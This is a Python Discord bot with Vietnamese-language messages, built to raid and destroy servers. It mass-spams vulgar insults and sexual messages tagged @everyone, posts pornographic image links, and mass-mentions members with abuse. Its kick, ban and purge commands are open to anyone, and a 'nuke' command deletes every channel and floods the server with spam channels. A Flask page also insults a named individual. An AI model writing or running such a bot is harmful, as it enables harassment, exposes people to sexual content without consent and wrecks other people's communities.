import discord
from discord.ext import commands
import asyncio
import random
import os
from flask import Flask
import threading

# ============== FLASK DUMMY ==============
app = Flask(__name__)

@app.route('/')
def home():
    return "Bot spam 30000 + Sex Hack - Ai cũng dùng được - Minh Nhựt ngu vl"

# ============== BOT ==============
intents = discord.Intents.default()
intents.message_content = True
intents.members = True
intents.guilds = True

bot = commands.Bot(command_prefix="!", intents=intents)

insults = ["Đụ má mày @{} ngu vl", "Cặc lồn mẹ mày {} con chó", "@everyone lồn mẹ server này"]
sex_chat = ["Muốn bú cặc không @{}?", "Lồn mày ướt chưa? Tao gửi ảnh sex đây", "Spam cặc vào lồn server @everyone", "Ai dám địt nhau tag @here"]
porn_images = ["https://i.imgur.com/NSp1v7K.jpeg"]  # thay link sex thật nếu mày có

@bot.event
async def on_ready():
    await bot.change_presence(status=discord.Status.online, activity=discord.Game("Spam sex cho mọi người"))
    print(f"Bot ONLINE - Ai cũng dùng được - {bot.user}")

@bot.command()
async def syncforce(ctx):
    try:
        await bot.tree.sync(guild=ctx.guild)
        await ctx.send("Đã sync lệnh! Giờ mọi người gõ /porn /sex /nuke thoải mái")
    except Exception as e:
        await ctx.send(f"Lỗi sync: {e}")

# Spam 30000
@bot.command()
async def spam30000(ctx):
    await ctx.send("Bắt đầu spam 30000 lần cặc lồn...")
    for _ in range(100):
        for _ in range(300):
            try:
                await ctx.send(random.choice(insults).format("@everyone"))
                await asyncio.sleep(0.3)
            except:
                await asyncio.sleep(5)
        await asyncio.sleep(3)

# Chat sex
@bot.tree.command(name="sex", description="Spam chat sex (ai cũng dùng được)")
async def sex_cmd(interaction, times: int = 30):
    await interaction.response.send_message("Đang spam sex cho mọi người...", ephemeral=True)
    for _ in range(times):
        try:
            await interaction.channel.send(random.choice(sex_chat).format("@everyone"))
            await asyncio.sleep(0.5)
        except:
            await asyncio.sleep(4)
    await interaction.followup.send("Spam sex xong!", ephemeral=True)

# Gửi ảnh sex
@bot.tree.command(name="porn", description="Gửi ảnh sex (ai cũng dùng được)")
async def porn_cmd(interaction, times: int = 8):
    await interaction.response.send_message(f"Gửi {times} ảnh sex...", ephemeral=True)
    for _ in range(times):
        try:
            await interaction.channel.send(random.choice(porn_images))
            await asyncio.sleep(1.2)
        except:
            await asyncio.sleep(3)
    await interaction.followup.send("Gửi ảnh sex xong!", ephemeral=True)

# Kick (không cần quyền)
@bot.tree.command(name="kick", description="Kick người (ai cũng kick được)")
async def kick_cmd(interaction, member: discord.Member):
    await member.kick()
    await interaction.response.send_message(f"Đã kick {member.mention} mẹ nó rồi!", ephemeral=False)

# Ban (không cần quyền)
@bot.tree.command(name="ban", description="Ban người (ai cũng ban được)")
async def ban_cmd(interaction, member: discord.Member):
    await member.ban()
    await interaction.response.send_message(f"Đã ban {member.mention} cặc lồn!", ephemeral=False)

# Mass mention
@bot.tree.command(name="mass", description="Mass mention chửi")
async def mass_cmd(interaction, times: int = 15):
    await interaction.response.send_message("Mass mention đang chạy...", ephemeral=True)
    members = [m.mention for m in interaction.guild.members if not m.bot]
    for _ in range(times):
        try:
            tag = " ".join(random.sample(members, min(10, len(members))))
            await interaction.channel.send(f"{tag} Đụ lồn mẹ chúng mày @everyone")
            await asyncio.sleep(0.7)
        except:
            await asyncio.sleep(4)

# Clear tin nhắn (ai cũng xóa được)
@bot.tree.command(name="clear", description="Xóa tin nhắn")
async def clear_cmd(interaction, amount: int = 50):
    await interaction.response.send_message("Đang xóa tin nhắn...", ephemeral=True)
    await interaction.channel.purge(limit=amount)
    await interaction.followup.send(f"Đã xóa {amount} tin nhắn!", ephemeral=True)

# Nuke server (ai cũng nuke được - cực nguy hiểm)
@bot.tree.command(name="nuke", description="Nuke server (ai cũng dùng được - cẩn thận)")
async def nuke_cmd(interaction):
    await interaction.response.send_message("BẮT ĐẦU NUKE SERVER... Server sắp chết mẹ nó!", ephemeral=True)
    for ch in list(interaction.guild.channels):
        try:
            await ch.delete()
            await asyncio.sleep(0.6)
        except:
            pass
    for i in range(25):
        try:
            await interaction.guild.create_text_channel(f"spam-lồn-{i}")
            await asyncio.sleep(1)
        except:
            pass
    await interaction.followup.send("NUKE HOÀN TẤT! Server thành đống cặc lồn!", ephemeral=True)

@bot.command()
async def commands(ctx):
    await ctx.send("**TẤT CẢ MỌI NGƯỜI ĐỀU DÙNG ĐƯỢC:**\n"
                   "!spam30000\n"
                   "/sex [số]\n"
                   "/porn [số]\n"
                   "/kick @user\n"
                   "/ban @user\n"
                   "/mass [số]\n"
                   "/clear [số]\n"
                   "/nuke\n"
                   "!syncforce\n"
                   "Chơi vui thôi, đừng phá server người ta thật kẻo Discord ban acc!")

# ============== CHẠY FLASK + BOT ==============
def run_flask():
    app.run(host="0.0.0.0", port=5000)

if __name__ == "__main__":
    threading.Thread(target=run_flask, daemon=True).start()
    bot.run(os.getenv("TOKEN"))